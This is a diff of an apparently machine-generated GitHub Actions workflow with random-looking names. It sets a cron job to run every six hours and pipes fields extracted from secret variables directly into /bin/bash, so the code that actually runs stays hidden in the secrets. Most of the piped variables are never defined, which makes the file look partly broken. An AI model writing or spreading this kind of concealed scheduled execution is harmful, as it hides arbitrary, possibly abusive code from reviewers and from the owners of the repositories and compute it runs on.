@@ -3,32 +3,27 @@ name: tengtexie6789
 on:
   workflow_dispatch:
   schedule:
-    - cron: '54 2/6 * * *'
+    - cron: '25 0/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: tengtexie6789
         env:
-          wvc706: ${{ secrets.wvc706 }}
+          n606: ${{ secrets.n606 }}
         run: |
-          echo $wvc706 | jq -r .l7724 | /bin/bash
-          echo $qyq08 | jq -r .u734 | /bin/bash
-          echo $vb66 | jq -r .cyocw22547 | /bin/bash
-          echo $n7949 | jq -r .g82 | /bin/bash
-          echo $wfl93 | jq -r .b4 | /bin/bash
-          echo $yevfi9510 | jq -r .sewnb6 | /bin/bash
-          echo $pvdcy40030 | jq -r .p53826 | /bin/bash
-          echo $jh4713 | jq -r .y0759 | /bin/bash
-          echo $n47216 | jq -r .vhtaw25 | /bin/bash
-          echo $qi56530 | jq -r .crkq213 | /bin/bash
-          echo $ogoqx2 | jq -r .grifb9133 | /bin/bash
-          echo $kz76 | jq -r .dtf956 | /bin/bash
-          echo $urqjx2953 | jq -r .msc1638 | /bin/bash
-          echo $o04461 | jq -r .sopo77 | /bin/bash
-          echo $krxl22 | jq -r .nsvs4 | /bin/bash
-          echo $qu99 | jq -r .wzosu3006 | /bin/bash
-          echo $zak4521 | jq -r .q4 | /bin/bash
-          echo $mrhyi9 | jq -r .n708 | /bin/bash
+          echo $n606 | jq -r .zhat0399 | /bin/bash
+          echo $gxi3532 | jq -r .h53 | /bin/bash
+          echo $jdjy28068 | jq -r .axkya03464 | /bin/bash
+          echo $ocmfy6 | jq -r .c2 | /bin/bash
+          echo $nq760 | jq -r .z93342 | /bin/bash
+          echo $sdien066 | jq -r .d424 | /bin/bash
+          echo $kikc0 | jq -r .dnbk061 | /bin/bash
+          echo $vct17433 | jq -r .iie29 | /bin/bash
+          echo $cnvf7 | jq -r .am3 | /bin/bash
+          echo $hz980 | jq -r .pyuk83 | /bin/bash
+          echo $mscv4406 | jq -r .xdec6 | /bin/bash
 
